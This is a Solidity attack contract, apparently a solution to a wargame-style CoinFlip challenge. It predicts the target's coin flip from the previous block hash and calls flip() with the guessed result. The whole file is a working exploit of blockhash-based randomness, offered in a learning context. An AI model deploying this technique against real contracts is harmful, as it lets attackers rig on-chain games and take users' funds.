// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract AttackingCoinFlip {
    address public coinFlipAddress;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlipAddress = _coinFlipAddress;
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        ICoinFlip(coinFlipAddress).flip(coinFlip == 1);
    }
}
